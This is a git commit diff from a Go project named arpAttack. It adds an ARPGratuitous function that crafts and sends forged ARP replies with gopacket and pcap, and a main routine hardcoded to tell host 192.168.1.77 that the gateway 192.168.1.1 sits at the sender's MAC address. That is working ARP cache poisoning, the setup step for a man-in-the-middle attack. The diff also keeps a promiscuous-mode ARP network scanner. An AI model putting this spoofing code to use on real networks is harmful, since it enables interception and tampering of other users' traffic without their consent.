9bd3220924e8872e39c7262a91c7bddc61ce379e
Roger Coll <roger.coll.aumatell@gmail.com>
2020-03-15 17:30:38 +0100

    Changing main and introducing ARPGratuitous

--- arpAttack.go
+++ arpAttack.go
@@ -7,13 +7,47 @@ import (
 	"fmt"
 	"log"
 	"net"
-	"sync"
 	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
+
+func ARPGratuitous(handler *pcap.Handle, iface *net.Interface, DstHwAddress, Daddr, Saddr []byte) error {
+	//arp gratuitious is an arp reply without being an arp request
+	//Modify the Saddr depending on the victim role
+	eth := layers.Ethernet{
+		SrcMAC:       iface.HardwareAddr,
+		DstMAC:       DstHwAddress,
+		EthernetType: layers.EthernetTypeARP,
+	}
+	arp := layers.ARP{
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     6,
+		ProtAddressSize:   4,
+		Operation:         layers.ARPReply,
+		SourceHwAddress:   []byte(iface.HardwareAddr),
+		SourceProtAddress: Saddr,
+		DstHwAddress:      DstHwAddress,
+		DstProtAddress:    Daddr,
+	}
+	fmt.Printf("%+v\n", eth)
+	fmt.Printf("%+v\n", arp)
+	// Set up buffer and options for serialization.
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+	gopacket.SerializeLayers(buf, opts, &eth, &arp)
+	if err := handler.WritePacketData(buf.Bytes()); err != nil {
+		return err
+	}
+
+	return nil
+}
 
 // ips is a simple and not very good method for getting all IPv4 addresses from a
 // net.IPNet.  It returns all IPs it can over the channel it sends back, closing
@@ -91,9 +125,44 @@ func readARP(handler *pcap.Handle, iface *net.Interface, stop chan struct{}) {
 }
 
 func scan(iface *net.Interface) error {
+	if addr, err := getValidAddress(iface); err != nil {
+		return nil
+	} else {
+		log.Printf("Using network range %v for interface %v", addr, iface.Name)
+
+		//pcap => packet capturer
+		/*
+			In networking terms, a computer having its network interface card set to “promiscuous mode”
+			receives all packets on the same network segment.
+			In “normal mode,” a network card accepts only packets addressed to its MAC Address.
+		*/
+		handler, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
+		if err != nil {
+			return err
+		}
+		defer handler.Close()
+
+		stop := make(chan struct{})
+		go readARP(handler, iface, stop)
+		defer close(stop)
+
+		for {
+			if err := writeARP(handler, iface, addr); err != nil {
+				log.Printf("error writing packets on %v: %v", iface.Name, err)
+				return err
+			}
+			//10 seconds should be more than enough to recive a response
+			time.Sleep(10 * time.Second)
+		}
+	}
+
+	return nil
+}
+
+func getValidAddress(iface *net.Interface) (*net.IPNet, error) {
 	var faddr *net.IPNet //final address
 	if addrs, err := iface.Addrs(); err != nil {
-		return err
+		return nil, err
 	} else {
 		for _, addr := range addrs {
 			if ipnet, ok := addr.(*net.IPNet); ok {
@@ -111,60 +180,79 @@ func scan(iface *net.Interface) error {
 		}
 	}
 	if faddr == nil {
-		return errors.New("No good IP found for that interface")
+		return nil, errors.New("No good IP found for that interface")
 	} else if faddr.IP[0] == 127 {
-		return errors.New("Skipping localhost")
+		return nil, errors.New("Skipping localhost")
 	} else if faddr.IP[0] == 172 {
-		return errors.New("Skipping docker interfaces")
+		return nil, errors.New("Skipping docker interfaces")
 	} else if faddr.Mask[0] != 0xff || faddr.Mask[1] != 0xff {
-		return errors.New("Network(mask) to large for that interface")
+		return nil, errors.New("Network(mask) to large for that interface")
 	}
+	return faddr, nil
+}
 
-	log.Printf("Using network range %v for interface %v", faddr, iface.Name)
-
-	//pcap => packet capturer
-	/*
-		In networking terms, a computer having its network interface card set to “promiscuous mode”
-		receives all packets on the same network segment.
-		In “normal mode,” a network card accepts only packets addressed to its MAC Address.
-	*/
-	handler, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
+func getInterfaces() ([]net.Interface, error) {
+	ifaces, err := net.Interfaces()
 	if err != nil {
-		return err
+		return nil, err
 	}
-	defer handler.Close()
-
-	stop := make(chan struct{})
-	go readARP(handler, iface, stop)
-	defer close(stop)
-
-	for {
-		if err := writeARP(handler, iface, faddr); err != nil {
-			log.Printf("error writing packets on %v: %v", iface.Name, err)
-			return err
-		}
-		//10 seconds should be more than enough to recive a response
-		time.Sleep(10 * time.Second)
-	}
-	return nil
+	return ifaces, nil
 }
 
 func main() {
-	var wg sync.WaitGroup
-	ifaces, err := net.Interfaces()
+	/*
+		var wg sync.WaitGroup
+		ifaces, err := getInterfaces()
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		for _, iface := range ifaces {
+			fmt.Printf("%+v\n", iface)
+			wg.Add(1)
+			go func(iface net.Interface) {
+				defer wg.Done()
+				if err := scan(&iface); err != nil {
+					log.Printf("Interface %s error: %v", iface.Name, err)
+				}
+			}(iface)
+		}
+		wg.Wait()
+	*/
+	ifaces, err := getInterfaces()
 	if err != nil {
 		log.Fatal(err)
 	}
-
 	for _, iface := range ifaces {
-		fmt.Printf("%+v\n", iface)
-		wg.Add(1)
-		go func(iface net.Interface) {
-			defer wg.Done()
-			if err := scan(&iface); err != nil {
-				log.Printf("Interface %s error: %v", iface.Name, err)
+		if iface.Name == "wlp58s0" {
+			addr, err := getValidAddress(&iface)
+			if err != nil {
+				log.Fatal(err)
 			}
-		}(iface)
+			fmt.Printf("%+v", addr)
+			handler, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
+			if err != nil {
+				log.Fatal(err)
+			}
+			defer handler.Close()
+
+			stop := make(chan struct{})
+			go readARP(handler, &iface, stop)
+			defer close(stop)
+
+			dstHard, err := net.ParseMAC("9c:b6:d0:c2:73:c9")
+			if err != nil {
+				log.Fatal(err)
+			}
+			dstAddr := net.ParseIP("192.168.1.77")
+			sAddr := net.ParseIP("192.168.1.1")
+
+			if err := ARPGratuitous(handler, &iface, dstHard, dstAddr, sAddr); err != nil {
+				log.Printf("error writing arp reply packets on %v: %v", iface.Name, err)
+				log.Fatal(err)
+			}
+			//10 seconds should be more than enough to recive a response
+			time.Sleep(20 * time.Second)
+		}
 	}
-	wg.Wait()
 }
--- go.mod
+++ go.mod
@@ -2,4 +2,7 @@ module github.com/rogercoll/arpAttack
 
 go 1.13
 
-require github.com/google/gopacket v1.1.17
+require (
+	github.com/google/gopacket v1.1.17
+	github.com/stretchr/testify v1.5.1
+)
